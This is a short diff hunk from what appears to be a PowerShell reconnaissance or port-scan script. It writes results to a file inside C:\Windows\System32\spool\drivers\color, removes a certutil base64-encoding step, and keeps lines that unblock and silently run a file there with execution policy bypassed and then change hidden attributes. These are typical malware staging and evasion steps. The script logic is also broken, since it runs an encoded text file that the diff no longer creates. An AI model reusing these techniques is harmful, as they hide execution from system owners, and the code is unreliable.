@@ -102,8 +102,6 @@ foreach($port in $text_port){
 Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
-# Encode base64
-certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\0.txt"
 attrib -h 1.txt
